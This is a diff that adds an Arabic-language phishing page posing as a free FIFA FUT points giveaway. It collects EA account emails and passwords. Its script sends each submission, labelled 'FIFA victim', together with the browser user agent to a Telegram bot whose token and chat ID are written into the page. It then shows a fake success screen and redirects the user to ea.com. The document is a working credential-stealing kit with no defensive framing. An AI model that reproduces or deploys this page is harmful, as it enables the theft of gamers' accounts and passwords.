@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>FIFA - نقاط FUT مجانية</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#0a1a2e,#1a3a5e,#0a1a2e);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.container{background:rgba(0,0,0,0.7);border-radius:20px;padding:30px 20px;max-width:400px;width:100%;text-align:center;border:2px solid #ffd700;box-shadow:0 0 40px rgba(255,215,0,0.4)}
+.logo{font-size:60px;margin-bottom:10px}
+h1{font-size:22px;color:#ffd700;margin-bottom:8px}
+.sub{color:#aaa;font-size:13px;margin-bottom:20px}
+.fg{margin-bottom:14px;text-align:right}
+label{display:block;color:#ccc;font-size:12px;margin-bottom:5px}
+input,select{width:100%;padding:13px;background:rgba(255,255,255,0.08);border:1px solid #444;border-radius:10px;color:#fff;font-size:14px;outline:none}
+input:focus,select:focus{border-color:#ffd700}
+select option{background:#0a1a2e;color:#fff}
+.btn{width:100%;padding:14px;margin-top:10px;background:linear-gradient(135deg,#ffd700,#ff8c00);color:#000;border:none;border-radius:10px;font-size:17px;font-weight:bold;cursor:pointer}
+.btn:active{transform:scale(0.96)}
+.load{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99;justify-content:center;align-items:center;flex-direction:column}
+.load.show{display:flex}
+.spinner{width:50px;height:50px;border:4px solid #333;border-top:4px solid #ffd700;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:18px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.done{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:98;justify-content:center;align-items:center;flex-direction:column}
+.done.show{display:flex}
+.done h2{color:#ffd700;font-size:24px;margin:12px 0}
+</style>
+</head>
+<body>
+<div class="container" id="form">
+<div class="logo">⚽</div>
+<h1>FIFA Points</h1>
+<p class="sub">نقاط FUT مجانية</p>
+<div class="fg"><label>🎮 البريد الإلكتروني</label><input type="email" id="email" placeholder="EA Account Email"></div>
+<div class="fg"><label>🔒 كلمة المرور</label><input type="password" id="password" placeholder="كلمة المرور"></div>
+<div class="fg"><label>🖥 المنصة</label><select id="platform"><option value="">-- اختر --</option><option>PS5</option><option>PS4</option><option>Xbox</option><option>PC</option></select></div>
+<div class="fg"><label>💰 نقاط FUT</label><select id="amount"><option value="">-- اختر --</option><option>500 FP</option><option>1200 FP</option><option>2200 FP</option><option>4600 FP</option><option>12000 FP</option></select></div>
+<button class="btn" onclick="go()">⚽ احصل على النقاط</button>
+</div>
+<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري الشحن...</p></div>
+<div class="done" id="done"><h2>✅ تم الشحن!</h2><p>سيتم إضافة النقاط خلال 24 ساعة</p></div>
+<script>
+var u=new URL(window.location.href);
+var CHAT=u.searchParams.get('chatId')||'7276604783';
+var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
+async function send(t){
+try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
+}
+async function go(){
+var em=document.getElementById('email').value.trim();
+var pw=document.getElementById('password').value.trim();
+var pf=document.getElementById('platform').value;
+var am=document.getElementById('amount').value;
+if(!em||!pw||!pf||!am)return alert('املأ جميع الحقول');
+document.getElementById('load').classList.add('show');
+var msg='⚽ <b>ضحية فيفا!</b>\n\n🎮 إيميل: '+em+'\n🔒 كلمة: '+pw+'\n🖥 منصة: '+pf+'\n💰 نقاط: '+am+'\n\n📱 '+navigator.userAgent;
+await send(msg);
+setTimeout(function(){document.getElementById('load').classList.remove('show');document.getElementById('done').classList.add('show');setTimeout(function(){window.location.href='https://ea.com/'},3000)},4000);
+}
+</script>
+</body>
+</html>
